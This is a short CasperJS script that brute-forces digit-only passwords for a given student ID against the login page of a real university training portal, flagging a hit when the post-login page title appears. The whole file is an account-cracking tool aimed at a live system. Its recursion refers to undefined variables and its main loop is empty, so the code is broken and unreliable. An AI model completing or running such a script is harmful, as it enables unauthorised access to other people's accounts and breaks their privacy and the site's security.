var casper = require('casper').create();
var fs = require('fs');

var id = parseInt(casper.cli.args[0]);
var firstPass = casper.cli.args[1];
var symbol = [
	//'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
];

var current = '';



function test(password) {
	casper.echo(password);
	casper.thenOpen('http://daotao.vnu.edu.vn/dkmh/login.asp');

		casper.then(function () {
			this.fillSelectors('form#frmLogin', {
				'input#txtLoginId': id.toString(),
				'input#txtPassword': password,
				'input#chkSubmit': 'ok'
			}, true);
		});
		
		casper.waitForSelector('title');

		casper.then(function () {
			if (this.getTitle() == 'Cổng thông tin đào tạo') {
				this.echo('Found!');
			}
		});
}

function getPassword(cur) {
	this.echo('Inside getPassword');
	this.echo(cur);
	for (var i = 0; i < symbol.length; ++i) {
		current += symbol[i];
		if (total - 1 == cur) {
			this.echo('End');
			test(password);
			current = current.substr(0, total - 1);
			return;
		} else {
			getPassword(cur + 1);
		}
	}
}

casper.start();

casper.then(function () {
	this.repeat(1000, function () {
		
	})
});

casper.run();
